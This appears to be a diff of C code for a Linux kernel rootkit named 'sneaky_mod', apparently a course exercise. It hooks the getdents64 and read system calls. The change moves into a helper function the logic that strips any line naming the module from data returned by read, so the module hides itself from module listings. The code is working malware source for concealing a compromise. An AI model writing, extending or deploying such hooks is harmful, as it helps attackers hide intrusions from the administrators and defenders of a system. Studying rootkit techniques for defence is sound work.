@@ -118,13 +118,29 @@ asmlinkage int sneaky_sys_getdents64(struct pt_regs * regs) {
 
 static asmlinkage ssize_t (*original_read)(struct pt_regs * regs);
 
+ssize_t replace_line(char *buffer, ssize_t nreads, const char *target, const char *replacement) {
+  char *line_start = NULL;
+  char *new_line = NULL;
+
+  line_start = strnstr(buffer, target, nreads);
+  if (line_start != NULL) {
+    new_line = strnstr(line_start, "\n", nreads - (line_start - buffer));
+    if (new_line != NULL) {
+      memmove(line_start, new_line + 1, (buffer + nreads - 1) - new_line);
+      nreads -= (new_line - line_start + 1);
+    } else {
+      nreads = line_start - buffer;
+    }
+  }
+
+  return nreads;
+}
+
 asmlinkage ssize_t sneaky_sys_read(struct pt_regs * regs) {
   char * buffer;
   void * buf;
   size_t count;
   ssize_t nreads = original_read(regs);
-  char * line_start = NULL;
-  char * new_line = NULL;
   
   if (nreads <= 0) {
     return nreads;
@@ -136,16 +152,7 @@ asmlinkage ssize_t sneaky_sys_read(struct pt_regs * regs) {
 
   copy_from_user((void *) buffer, buf, count);
 
-  line_start = strnstr(buffer, "sneaky_mod ", nreads);
-  if (line_start != NULL) {
-    new_line = strnstr(line_start, "\n", nreads - (line_start - buffer));
-    if (new_line != NULL) {
-      memmove(line_start, new_line + 1, (buffer + nreads - 1) - new_line);
-      nreads -= (new_line - line_start + 1);
-    } else {
-      nreads = line_start - buffer;
-    }
-  }
+  nreads = replace_line(buffer, nreads, "sneaky_mod ", "");
 
   copy_to_user(buf, (void *) buffer, count);
   
